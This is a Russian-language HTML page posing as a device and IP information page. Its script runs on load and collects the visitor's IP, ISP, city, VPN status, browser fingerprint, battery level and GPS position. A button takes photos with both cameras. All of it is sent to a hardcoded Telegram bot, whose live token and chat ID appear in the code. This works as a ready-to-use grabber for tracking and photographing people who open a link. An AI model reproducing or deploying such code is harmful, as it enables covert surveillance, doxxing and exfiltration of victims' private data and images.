<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Информация об устройстве и определение IP</title>
</head>
<body>
    <h1>Добро пожаловать на страницу определения информации об устройстве и IP</h1>
    <p>Информация о вашем устройстве и IP-адрес будет отправлена в Telegram-бот.</p>

    <button onclick="takePhoto()">Сделать фото</button>

    <script>
        // Функция для доступа к камерам и снимка
        async function takePhoto() {
            const constraints = {
                video: { facingMode: "user" } // Для передней камеры
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise((resolve) => (video.onloadedmetadata = resolve));
                video.play();

                // Захват фото с передней камеры
                const frontPhoto = captureImage(video);
                console.log('Фото с передней камеры сделано');

                // Смена на заднюю камеру
                constraints.video.facingMode = { exact: "environment" };
                const backStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = backStream;
                await new Promise((resolve) => (video.onloadedmetadata = resolve));
                video.play();

                // Захват фото с задней камеры
                const backPhoto = captureImage(video);
                console.log('Фото с задней камеры сделано');

                // Отправка фотографий в Telegram-бот
                sendPhotoToTelegram(frontPhoto, 'Передняя камера');
                sendPhotoToTelegram(backPhoto, 'Задняя камера');

            } catch (error) {
                console.error('Ошибка при доступе к камере:', error);
            }
        }

        // Функция для захвата изображения из видео-потока
        function captureImage(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png');
        }

        // Функция для отправки фотографии в Telegram-бот
        function sendPhotoToTelegram(photoData, camera) {
            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
            const chatId = '1653222949';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', dataURItoBlob(photoData));
            formData.append('caption', `Фото с ${camera}`);

            fetch(telegramApiUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log(`Фото с ${camera} отправлено в Telegram:`, data);
            })
            .catch(error => {
                console.error(`Ошибка при отправке фото с ${camera} в Telegram:`, error);
            });
        }

        // Функция для преобразования DataURI в Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

       // Функция для получения геолокации пользователя
        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        console.log(`Широта: ${latitude}, Долгота: ${longitude}`);
                        sendLocationToTelegram(latitude, longitude);
                    },
                    (error) => {
                        console.error('Ошибка при получении геолокации:', error);
                    }
                );
            } else {
                console.error('Геолокация не поддерживается этим браузером.');
            }
        }

        // Функция для отправки геолокации в Telegram-бот
        function sendLocationToTelegram(latitude, longitude) {
            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
            const chatId = '1653222949';  // Замените на ваш chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `Геолокация пользователя: ${latitude},${longitude}`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Геолокация отправлена в Telegram:', data);
            })
            .catch(error => {
                console.error('Ошибка при отправке геолокации в Telegram:', error);
            });
        }

        // Функция для получения информации об устройстве
        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const deviceInfo = {
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                uptime: Math.round(performance.now() / 1000), // Время работы системы в секундах
                webglSupport: supportsWebGL(),
                fonts: await getFonts(),
                renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
            };

            // Основная информация об устройстве из userAgent
            if (/android/i.test(userAgent)) {
                deviceInfo.device = 'Android';
            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                deviceInfo.device = 'iOS';
            } else {
                deviceInfo.device = 'Unknown';
            }

            // Информация о браузере
            if (/chrome|crios|crmo/i.test(userAgent)) {
                deviceInfo.browser = 'Chrome';
            } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
                deviceInfo.browser = 'Firefox';
            } else if (/safari/i.test(userAgent)) {
                deviceInfo.browser = 'Safari';
            } else if (/msie|trident/i.test(userAgent)) {
                deviceInfo.browser = 'Internet Explorer';
            } else {
                deviceInfo.browser = 'Unknown';
            }

            // Получение уровня заряда батареи
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.batteryLevel = battery.level * 100 + '%';
            } else {
                deviceInfo.batteryLevel = 'Not supported';
            }

            return deviceInfo;
        }

        // Функция для проверки поддержки WebGL
        function supportsWebGL() {
            try {
                const canvas = document.createElement('canvas');
                return !!window.WebGLRenderingContext && !!canvas.getContext('webgl');
            } catch (e) {
                return false;
            }
        }

        // Функция для получения списка установленных шрифтов
        async function getFonts() {
            const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Courier', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
            const availableFonts = [];
            for (const font of fontList) {
                if (document.fonts.check(`12px "${font}"`)) {
                    availableFonts.push(font);
                }
            }
            return availableFonts.join(', ');
        }

        // Функция для проверки скорости интернета
        function checkInternetSpeed() {
            const image = new Image();
            const startTime = new Date().getTime();
            let speed = 0;
            image.onload = function() {
                const endTime = new Date().getTime();
                const duration = (endTime - startTime) / 1000;
                const bitsLoaded = 1024 * 1024 * 8; // 1MB
                speed = (bitsLoaded / duration / (1024 * 1024)).toFixed(2); // Mbps
                sendSpeedToTelegram(speed);
            };
            image.src = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png?" + startTime;
        }

        // Функция для отправки данных скорости интернета в Telegram-бот
        function sendSpeedToTelegram(speed) {
            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
            const chatId = '1653222949';  // Замените на ваш chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `Скорость интернета: ${speed} Mbps`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Сообщение отправлено в Telegram:', data);
            })
            .catch(error => {
                console.error('Ошибка при отправке сообщения в Telegram:', error);
            });
        }

        // Функция для отправки данных в Telegram-бот
        function sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus) {
            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
            const chatId = '1653222949';  // Замените на ваш chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `
                IP-адрес пользователя: ${ipAddress}
                Устройство: ${deviceInfo.device}
                Браузер: ${deviceInfo.browser}
                Провайдер: ${isp}
                Разрешение экрана: ${deviceInfo.screenResolution}
                Язык: ${deviceInfo.language}
                Платформа: ${deviceInfo.platform}
                Время работы системы: ${deviceInfo.uptime} сек.
                Местоположение: ${location}
                Использование VPN/Proxy: ${vpnStatus}
                Поддержка WebGL: ${deviceInfo.webglSupport}
                Установленные шрифты: ${deviceInfo.fonts}
                Время рендеринга страницы: ${deviceInfo.renderTime} мс
                Уровень заряда батареи: ${deviceInfo.batteryLevel}
            `;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Сообщение отправлено в Telegram:', data);
            })
            .catch(error => {
                console.error('Ошибка при отправке сообщения в Telegram:', error);
            });
        }

        // Функция для проверки использования VPN или прокси
        function checkVPN(ipAddress) {
            return fetch(`https://ipapi.co/${ipAddress}/json/`)
                .then(response => response.json())
                .then(data => data.security ? data.security.is_vpn : 'Unknown')
                .catch(() => 'Unknown');
        }

        // Получение IP-адреса пользователя с помощью внешнего сервиса
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                console.log('IP-адрес:', ipAddress);

                // Получение информации о провайдере и местоположении
                fetch(`https://ipapi.co/${ipAddress}/json/`)
                    .then(response => response.json())
                    .then(async data => {
                        const isp = data.org || 'Unknown';
                        const location = `${data.city}, ${data.region}, ${data.country}`;
                        console.log('Провайдер:', isp);
                        console.log('Местоположение:', location);

                        const vpnStatus = await checkVPN(ipAddress);
                        console.log('Использование VPN/Proxy:', vpnStatus);

                        const deviceInfo = await getDeviceInfo();
                        console.log('Информация об устройстве:', deviceInfo);

                        sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus);
                    })
                    .catch(error => {
                        console.error('Ошибка при получении информации о провайдере и местоположении:', error);
                    });
            })
            .catch(error => {
                console.error('Ошибка при получении IP-адреса:', error);
            });

        // Проверка скорости интернета
        checkInternetSpeed();

        // Вызов функции для получения геолокации
        getGeolocation();
    </script>
</body>
</html>
